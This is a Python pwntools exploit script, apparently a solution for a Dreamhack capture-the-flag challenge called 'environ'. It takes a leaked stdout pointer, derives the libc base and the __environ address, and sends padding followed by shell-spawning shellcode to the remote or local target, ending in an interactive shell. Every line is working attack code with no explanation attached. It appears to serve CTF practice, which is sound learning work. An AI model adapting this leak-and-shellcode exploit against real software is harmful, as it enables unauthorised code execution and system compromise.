#!/usr/bin/env python3

from pwn import *

exe = ELF("./environ_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 24068)

    return r


def main():
    r = conn()

    r.recvuntil(b"stdout: ")
    _io_2_1_stdout_ = int(r.recvline()[:-1], 16)
    
    libc_base = _io_2_1_stdout_ - libc.symbols["_IO_2_1_stdout_"]
    __environ = libc_base + libc.symbols["__environ"]
    
    payload = b"A" * 0x118
    payload += asm(shellcraft.sh())

    r.sendlineafter(b"Size: ", str(len(payload)).encode())
    r.sendafter(b"Data: ", payload)
    r.sendlineafter(b"*jmp=", str(__environ).encode())

    r.interactive()


if __name__ == "__main__":
    main()
